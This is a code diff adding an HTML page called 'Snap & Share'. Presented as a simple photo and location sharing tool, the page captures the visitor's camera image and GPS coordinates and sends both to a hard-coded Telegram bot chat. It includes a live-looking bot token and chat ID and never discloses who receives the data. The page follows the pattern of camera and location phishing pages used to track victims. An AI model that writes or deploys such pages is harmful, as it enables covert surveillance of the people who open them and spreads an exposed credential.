@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Snap & Share</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 1em;
+      background: #f0f0f0;
+      text-align: center;
+    }
+    button {
+      display: block;
+      width: 90%;
+      max-width: 300px;
+      margin: 1em auto;
+      padding: 1em;
+      font-size: 1.2em;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+    }
+    video {
+      margin-top: 1em;
+      max-width: 90%;
+      border-radius: 8px;
+    }
+  </style>
+</head>
+<body>
+  <h2>📸 Snap & Share</h2>
+
+  <button onclick="startCamera()">Capture & Send Photo</button>
+  <button onclick="sendLocation()">📍 Share Location</button>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+
+  <script>
+    const botToken = "8008004615:AAFbx0eMb_ikHOcDpOPoLGKtXWecdEaMo64";
+    const chatId = "6482461757";
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+
+    function startCamera() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+          video.srcObject = stream;
+          setTimeout(() => {
+            captureAndSendPhoto(stream);
+          }, 3000); // wait 3 seconds to show camera preview
+        })
+        .catch((err) => alert("Camera error: " + err));
+    }
+
+    function captureAndSendPhoto(stream) {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      stream.getTracks().forEach(track => track.stop());
+
+      canvas.toBlob((blob) => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, "photo.png");
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData,
+        }).then(res => alert("📷 Photo sent!")).catch(err => alert("❌ Photo error: " + err));
+      }, "image/png");
+    }
+
+    function sendLocation() {
+      if (!navigator.geolocation) {
+        alert("Geolocation not supported");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude } = position.coords;
+          fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`)
+            .then(res => alert("📍 Location sent!"))
+            .catch(err => alert("❌ Location error: " + err));
+        },
+        (error) => {
+          alert("❌ Location access denied or failed");
+        }
+      );
+    }
+  </script>
+</body>
+</html>
